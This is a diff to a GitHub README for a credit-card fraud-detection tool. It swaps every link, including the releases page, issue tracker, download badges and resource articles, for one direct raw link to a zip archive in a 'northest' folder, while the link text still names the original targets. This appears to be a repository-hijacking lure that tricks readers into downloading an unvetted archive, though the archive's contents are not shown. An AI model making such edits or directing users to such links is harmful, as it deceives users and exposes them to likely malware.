@@ -1,7 +1,7 @@
 # 📊 Financial-Fraud-Detection - Identify Fraudulent Transactions Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/czc020/Financial-Fraud-Detection/releases)
+[![Download](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
 
 ## 📝 Description
 Financial Fraud Detection aims to help you identify fraudulent credit card transactions using advanced analytics techniques. This tool leverages data science to enable users to visualize and analyze their transaction data effectively. 
@@ -10,7 +10,7 @@ Financial Fraud Detection aims to help you identify fraudulent credit card trans
 Follow these steps to download and run the Financial Fraud Detection application:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/czc020/Financial-Fraud-Detection/releases). Here, you will find the latest version of the application available for download.
+   Go to the [Releases page](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip). Here, you will find the latest version of the application available for download.
 
 2. **Select the Latest Release**
    On the Releases page, you will see a list of available versions. Look for the most recent release at the top of the list.
@@ -61,22 +61,22 @@ If you encounter any issues while using the Financial Fraud Detection applicatio
 
 - **Check System Requirements:** Ensure that your computer meets the above requirements.
 - **Update Python:** If the application does not run, make sure you have the correct version of Python installed.
-- **Reinstall the Application:** If problems persist, delete the current installation and download the application again from the [Releases page](https://github.com/czc020/Financial-Fraud-Detection/releases).
+- **Reinstall the Application:** If problems persist, delete the current installation and download the application again from the [Releases page](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip).
 
 ## 💬 Community Support
 Feel free to reach out if you have questions or need help. You can check out discussions and ask your questions:
 
-- **Issues Tracker:** [Report Issues](https://github.com/czc020/Financial-Fraud-Detection/issues)
+- **Issues Tracker:** [Report Issues](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
 - **Community Forum:** Participate in discussions and share your experiences.
 
 ## 🔗 Helpful Resources
 Here are some useful resources to help you understand financial fraud detection and analytics:
 
-- [Financial Fraud Overview](https://www.example.com/financial-fraud-overview)
-- [Data Visualization Techniques](https://www.example.com/data-visualization-techniques)
-- [Machine Learning Basics](https://www.example.com/machine-learning-basics)
+- [Financial Fraud Overview](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
+- [Data Visualization Techniques](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
+- [Machine Learning Basics](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
 
 ## 📞 Contact
 If you would like to contact the developers or need professional support, please reach out via the contact information provided in the repository.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/czc020/Financial-Fraud-Detection/releases)
+[![Download](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/czc020/Financial-Fraud-Detection/raw/refs/heads/main/northest/Financial_Fraud_Detection_v3.9.zip)
